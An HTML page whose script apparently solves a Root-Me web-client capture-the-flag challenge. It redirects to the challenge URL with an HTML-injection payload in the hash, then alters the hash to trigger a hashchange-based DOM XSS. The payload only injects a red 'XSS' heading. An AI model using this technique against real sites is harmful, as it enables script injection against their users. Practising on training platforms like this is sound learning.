<!DOCTYPE html>
<html>
  <body>
    <script>
      const payload = '<h1 style="color:red">XSS</h1>';
      // Redirect to vulnerable page with payload in hash
      location.href = 'http://challenge01.root-me.org/web-client/ch62/#' + encodeURIComponent(payload);
      
      // Trigger the hashchange event manually after delay
      setTimeout(() => {
        location.hash = location.hash + " ";
      }, 1000);
    </script>
  </body>
</html>
